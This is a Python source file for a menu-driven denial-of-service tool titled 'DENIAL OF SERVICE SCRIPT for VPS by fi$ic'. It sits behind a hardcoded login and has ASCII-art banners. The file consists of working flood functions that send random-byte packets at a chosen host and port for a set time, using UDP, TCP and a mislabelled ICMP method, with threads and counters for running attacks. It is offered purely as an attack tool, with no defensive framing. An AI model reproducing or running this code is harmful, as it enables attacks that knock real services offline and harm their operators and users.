#!/usr/bin/env python3
#-*- coding: utf-8 -*-

import sys
import socket
import time
import random
import threading
import getpass
import os



sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ \x07")


#script visuals are here#


udpflood = """\033[31m  
               ▄• ▄▌·▄▄▄▄   ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄  
               █▪██▌██▪ ██ ▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██ 
               █▌▐█▌▐█· ▐█▌ ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌
               ▐█▄█▌██. ██ ▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██ 
                ▀▀▀ ▀▀▀▀▀• .▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀• 
\033[31m """


tcpflood = """\033[31m 
              ▄▄▄▄▄▄ ▄▄·  ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄  
               •██  ▐█ ▌▪▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██ 
                ▐█.▪██ ▄▄ ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌
                ▐█▌·▐███▌▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██ 
                ▀▀▀ ·▀▀▀ .▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀• 
\033[31m """


icmpflood = """\033[31m  
           ▪   ▄▄· • ▌ ▄ ·.  ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄  
           ██ ▐█ ▌▪·██ ▐███▪▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██ 
           ▐█·██ ▄▄▐█ ▌▐▌▐█· ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌
           ▐█▌▐███▌██ ██▌▐█▌▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██ 
           ▀▀▀·▀▀▀ ▀▀  █▪▀▀▀.▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀• 
\033[31m """


about = """
\033[33m             DENIAL OF SERVICE SCRIPT for VPS by fi$ic ~~ 2K20 ~~ \033[33m
"""


help = """\033[31m
   ▒ ▄░░ ░▒  ░ ░ ▒ ░ ▄ ░ ░   ░ ▒░░░▒░  ▄░░ ░▒  ░ ░ ▒ ░  ░ ░   ░ ▒░░░▒░  ░  ░  
   ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒░  ░ ▀░ ░ ▒░ ░▄ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒▄░░░▒░▄      ▒ ▄░   
    ░ ░█  ██  ██▒ ░░  ░  ░   █▒  ░      ░ ▄   ░    ▄██   ░ ░  ░     █
     █████▒██▓  ██████  ██▓ ▄████▄      ███▄ ▄███▓▓█████  ███▄    █  █    ██ 
   ▓██   ▒▓██▒▒██    ▒ ▓██▒▒██▀ ▀█     ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
   ▒████ ░▒██▒░ ▓██▄   ▒██▒▒▓█    ▄    ▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
   ░▓█▒  ░░██░  ▒   ██▒░██░▒▓▓▄ ▄██▒   ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
   ░▒█░   ░██░▒██████▒▒░██░▒ ▓███▀ ░   ▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
    ▒█ ░   ░▓  ▒ ▒▓▒ ▒ ░░▓  ░       ░  ███ ░  ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
    ░▄      ▒ ▄░░ ░▒  ░ ░ ▒ ░  ░ ░  ░      ▄ ░ ░  ░░ ░░  ▄ ░ ▒░░░▒░  ▄   ▒
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 █▓▒░                                                                      ░▒▓█
 █▓▒░                                                                      ░▒▓█
 █▓▒░\033[97m     CLS - CLEAR THE CONSOLE \033[31m                                         ░▒▓█
 █▓▒░\033[97m     ABOUT - ABOUT THE MENU \033[31m                                          ░▒▓█
 █▓▒░\033[97m     STOPATTACKS - STOP ALL ATACKS \033[31m                                   ░▒▓█
 █▓▒░                                                                      ░▒▓█
 █▓▒░ \033[97m    MENU - GO BACK TO THE FIRST MENU \033[31m                                ░▒▓█
 █▓▒░                                                                      ░▒▓█
 █▓▒░                                                                      ░▒▓█
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
 """


banner = """\033[31m
   ▒ ▄░░ ░▒  ░ ░ ▒ ░ ▄ ░ ░   ░ ▒░░░▒░  ▄░░ ░▒  ░ ░ ▒ ░  ░ ░   ░ ▒░░░▒░  ░  ░  
   ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒░  ░ ▀░ ░ ▒░ ░▄ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒▄░░░▒░▄      ▒ ▄░   
    ░ ░█  ██  ██▒ ░░  ░  ░   █▒  ░      ░ ▄   ░    ▄██   ░ ░  ░     █
     █████▒██▓  ██████  ██▓ ▄████▄      ███▄ ▄███▓▓█████  ███▄    █  █    ██ 
   ▓██   ▒▓██▒▒██    ▒ ▓██▒▒██▀ ▀█     ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
   ▒████ ░▒██▒░ ▓██▄   ▒██▒▒▓█    ▄    ▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
   ░▓█▒  ░░██░  ▒   ██▒░██░▒▓▓▄ ▄██▒   ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
   ░▒█░   ░██░▒██████▒▒░██░▒ ▓███▀ ░   ▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
    ▒█ ░   ░▓  ▒ ▒▓▒ ▒ ░░▓  ░       ░  ███ ░  ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
    ░▄      ▒ ▄░░ ░▒  ░ ░ ▒ ░  ░ ░  ░      ▄ ░ ░  ░░ ░░  ▄ ░ ▒░░░▒░  ▄   ▒
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 █▓▒░                                                                      ░▒▓█
 █▓▒░\033[97m	1. HELP \033[31m                                                           ░▒▓█
 █▓▒░   2. UDP FLOOD         [HOST PORT TIMEOUT SIZE] max 65500 bytes      ░▒▓█
 █▓▒░   3. TCP FLOOD         [HOST PORT TIMEOUT SIZE] max 65500 bytes      ░▒▓█
 █▓▒░   4. ICMP FLOOD        [HOST PORT TIMEOUT SIZE] max 65500 bytes      ░▒▓█
 █▓▒░ \033[97m	5. RUNNING ATTACKS \033[31m                                                ░▒▓█
 █▓▒░ \033[97m	6. STATS \033[31m                                                          ░▒▓█
 █▓▒░ \033[97m	7. EXIT SCRIPT \033[31m                                                    ░▒▓█
 █▓▒░                                                                      ░▒▓█
  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
"""

tattacks = 0
uaid = 0
taid = 0
iaid = 0
raid = 0
aid = 0
attack = True
udp = True
tcp = True
icmp = True


#ddos methods are here#


def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1


def tcpsender(host, port, timer, punch):
	global taid
	global tcp
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	taid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and tcp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	taid -= 1
	aid -= 1


def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

                ######################DDOS METHODS TESTING ZONE######################


               
			   
			   
			   
			    ######################DDOS METHODS TESTING ZONE######################

def main():

	global tattacks
	global uaid
	global iaid
	global taid
	global raid
	global aid
	global attack
	global udp
	global icmp
	

#functions are here#


	while True:

		choice = input("\033[31m [f$c] \033[97muser@{}: \033[97m".format (user))
		choices = choice.split(" ")[0]
		
		if choices == "help" or choices == "HELP" or choices == "1":
			print (help)
			print ("                                                     \033[97mLOGGED IN AS\033[97m \033[31muser@{} \033[31m".format (user))
			main()

		elif choices == "about" or choices == "ABOUT":
			print (about)
			main() 
      
		elif choices == "udp" or choices == "UDP" or choices == "2":
				time.sleep(2)
				try:
					choices, host, port, timer, pack = choice.split(" ")
					socket.gethostbyname(host)
					print (udpflood)
					print ("\033[97m                            ATTACKING\033[97m : \033[31m{}\033[31m".format (host))
					print ("\033[97m                              FOR\033[97m \033[31m{}\033[31m \033[97mSECONDS\033[97m".format (timer))
					print ("\033[97m                               WITH\033[97m \033[31m{}\033[31m \033[97mBYTES\033[97m".format (pack))					
					sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
					print ()
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ()
					print ("\033[31m [f$c]\033[31m \033[97mTHE COMMAND {} REQUIRES AN ARGUMENT\033[97m".format (choices))
					print ()
					main()
				except socket.gaierror:
					print ()
					print ("\033[31m [f$c]\033[31m \033[97mHOST: {} INVALID\033[97m".format (host))
					print ()
					main()

		elif choices == "tcp" or choices == "TCP" or choices == "3":
			time.sleep(2)
			try:
				choices, host, port, timer, pack = choice.split(" ")
				socket.gethostbyname(host)
				print (tcpflood)
				print ("\033[97m                            ATTACKING\033[97m : \033[31m{}\033[31m".format (host))
				print ("\033[97m                              FOR\033[97m \033[31m{}\033[31m \033[97mSECONDS\033[97m".format (timer))
				print ("\033[97m                               WITH\033[97m \033[31m{}\033[31m \033[97mBYTES\033[97m".format (pack))
				sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
				print ()
				punch = random._urandom(int(pack))
				threading.Thread(target=tcpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ()
				print ("\033[31m [f$c]\033[31m \033[97mTHE COMMAND {} REQUIRES AN ARGUMENT\033[97m".format (choices))
				print ()
				main()
			except socket.gaierror:
				print ()
				print ("\033[31m [f$c]\033[31m \033[97mHOST: {} INVALID\033[97m".format (host))
				print ()
				main()

		elif choices == "icmp" or choices == "ICMP" or choices == "4":
				time.sleep(2)
				try:
					choices, host, port, timer, pack = choice.split(" ")
					socket.gethostbyname(host)
					print (icmpflood)
					print ("\033[97m                            ATTACKING\033[97m : \033[31m{}\033[31m".format (host))
					print ("\033[97m                              FOR\033[97m \033[31m{}\033[31m \033[97mSECONDS\033[97m".format (timer))
					print ("\033[97m                               WITH\033[97m \033[31m{}\033[31m \033[97mBYTES\033[97m".format (pack))
					sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
					print ()
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ()
					print ("\033[31m [f$c]\033[31m \033[97mTHE COMMAND {} REQUIRES AN ARGUMENT\033[97m".format (choices))
					print ()
					main()
				except socket.gaierror:
					print ()
					print ("\033[31m [f$c]\033[31m \033[97mHOST: {} INVALID\033[97m".format (host))
					print ()
					main()

                  ######################DDOS METHODS TESTING ZONE######################					






                  ######################DDOS METHODS TESTING ZONE######################

		elif choices == "attacks" or choices == "ATTACKS" or choices == "5":
			print ()
			print ("\033[31m [f$c]\033[31m \033[97mUPD FLOOD ATTACKS RUNNING:\033[97m \033[31m{}\033[31m".format (uaid))
			print ("\033[31m [f$c]\033[31m \033[97mTCP FLOOD ATTACKS RUNNING:\033[97m \033[31m{}\033[31m".format (taid))			
			print ("\033[31m [f$c]\033[31m \033[97mICMP FLOOD ATTACKS RUNNING:\033[97m \033[31m{}\033[31m".format (iaid))
			print ("\033[31m [f$c]\033[31m \033[97mTOTAL ATTACKS RUNNING:\033[97m \033[31m{}\033[31m".format (aid))
			print ()
			main()

		elif choices == "cls" or choices == "CLS" or choices == "menu" or choices == "MENU":
			print (banner)
			print ("                                                     \033[97mLOGGED IN AS\033[97m \033[31muser@{} \033[31m".format (user))
		
		elif choices == "stats" or choices == "STATS" or choices == "6":
			print ()
			print ("\033[31m [f$c]\033[31m \033[97mTOTAL ATTACKS PERFORMED:\033[97m \033[31m{}\033[31m".format (tattacks))
			print ()
			main()

		elif choices == "exit" or choices == "EXIT" or choices == "7" or choices == "logout" or choices == "LOGOUT":
			exit()

		elif choices == "stopattacks" or choices == "STOPATTACKS":
			print ()
			print ("\033[97m                             STOPPING ALL\033[97m \033[31mATTACKS\033[31m")
			print ("\033[97m                             STOPPING ALL\033[97m \033[31mATTACKS\033[31m")
			sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ user@{}\x07".format (user))
			print ()
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			print ()
			print ("\033[31m [f$c]\033[31m \033[97m{} UNKNOWN COMMAND\033[97m".format(choices))
			print ()
			main()


#login form is here#

try:
	clear = "clear"
	os.system (clear)
	users = ["fisic"]
	username = getpass.getpass ("\033[31m [f$c]\033[31m \033[97mUSERNAME: \033[97m")
	if username in users:
		user = username
	else:
		print ("\033[31m [f$c] INCORRECT LOGIN\033[31m")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C PRESSED")
	exit()
try:
	passwords = ["fisic"]
	password = getpass.getpass ("\033[31m [f$c]\033[31m \033[97mPASSWORD: \033[97m")
	
	if user == "fisic":
		if password == passwords[0]:
			print ("\033[31m [f$c]\033[31m \33[32mCORRECT LOGIN - WELCOME user@{} \33[32m".format (user))
			time.sleep(2)	
			try:
				sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ user@{}\x07".format (user))
				print (banner)
				print ("                                                     \033[97mLOGGED IN AS\033[97m \033[31muser@{} \033[31m".format (user))
				main()
			except KeyboardInterrupt:
				print ()
				print ("\033[31m [f$c]\033[31m \033[97mCTRL-C HAS BEEN PRESSED, PRESS AGAIN TO EXIT\033[97m")
				print ()
				main()
		else:
			print ("\033[31m [f$c] INCORRECT LOGIN\033[31m")
			exit()

except KeyboardInterrupt:
	exit()

		